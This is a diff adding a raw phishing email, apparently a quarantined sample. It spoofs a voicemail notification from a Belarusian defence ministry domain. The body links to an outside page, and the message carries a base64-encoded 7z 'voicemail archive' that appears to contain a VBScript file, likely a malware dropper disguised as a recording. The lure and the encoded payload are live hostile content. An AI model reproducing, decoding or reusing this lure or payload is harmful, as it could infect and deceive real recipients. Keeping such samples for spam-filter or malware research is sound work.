@@ -1,0 +1,97 @@
+Return-Path: <vmservice@mod.mil.by>
+Delivered-To: spam-quarantine
+X-Envelope-To: <milcoop@mod.mil.by>
+Received-SPF: Fail (SPF fail - not authorized) identity=mailfrom; client-ip=197.3.254.222; helo=[197.3.254.222]; envelope-from=vmservice@mod.mil.by; receiver=milcoop@mod.mil.by 
+Authentication-Results: mail.mod.mil.by; dmarc=fail (p=reject dis=none) header.from=mod.mil.by
+Authentication-Results: mail.mod.mil.by; dkim=none reason="no signature";
+	dkim-adsp=discard (unprotected policy); dkim-atps=neutral
+Received: from [197.3.254.222] (unknown [197.3.254.222])
+	by mail.mod.mil.by (Microsoft SMTP Server id 8.1.436.0) with ESMTP id C99BC1518E
+	for <milcoop@mod.mil.by>; Mon,  9 Oct 2017 20:03:13 +0300 (+03)
+Date: Mon, 09 Oct 2017 18:03:09 +0100
+From: "Voicemail Service" <vmservice@mod.mil.by>
+To: "milcoop@mod.mil.by" <milcoop@mod.mil.by>
+Subject: New voice  message 18365685373 in mailbox 183656853731 from "18365685373" <5492870242>
+Message-ID: <Asterisk-18365685373-507791338-183656853731-3097@local>
+X-Asterisk-CallerID: 5492870242
+X-Asterisk-CallerIDName: 18365685373
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----voicemail_1836568537318365685373843944025740988"
+X-Nonspam: None
+
+
+This is a multi-part message in MIME format.
+
+------voicemail_1836568537318365685373843944025740988
+Content-Type: text/plain; charset=ISO-8859-1
+Content-Transfer-Encoding: 8bit
+
+Dear user:
+
+just wanted to let you know you were just left a 0:13 long message (number 18365685373)
+in mailbox 183656853731 from "18365685373" <5492870242>, on Mon, 09 Oct 2017 18:03:09 +0100
+so you might want to <a href="http://weloveflowers.co.uk/voicemsg.html>check</a> it when you get a chance.  Thanks!
+
+				--Voicemail Service
+
+------voicemail_1836568537318365685373843944025740988
+Content-Type: application/octet-stream; name="msg001906738.7z"
+Content-Transfer-Encoding: base64
+Content-Description: Voicemail archive attachment.
+Content-Disposition: attachment; filename="msg001906738.7z"
+
+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
+AAAAAA==
+
+------voicemail_1836568537318365685373843944025740988--
